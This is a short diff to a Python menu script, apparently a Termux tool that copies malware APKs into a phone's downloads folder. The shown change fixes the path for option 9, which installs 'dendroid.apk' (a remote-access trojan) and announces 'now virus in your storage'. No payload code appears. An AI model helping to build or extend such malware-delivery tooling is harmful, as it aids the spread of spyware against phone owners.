@@ -79,7 +79,7 @@ elif choose == "8":
     print(Colors.green + "note don't delete any file on this tool")
 elif choose == "9":
     os.system("mv d. dendroid.apk")
-    os.system("cp dendroid.apk data/data/com.termux/files/home/storage/downloads")
+    os.system("cp dendroid.apk /data/data/com.termux/files/home/storage/downloads")
     print(Colors.green + "now virus in your storage")
     print(Colors.green + "now check downloads folder")
     print(Colors.green + "note don't delete any file on this tool")
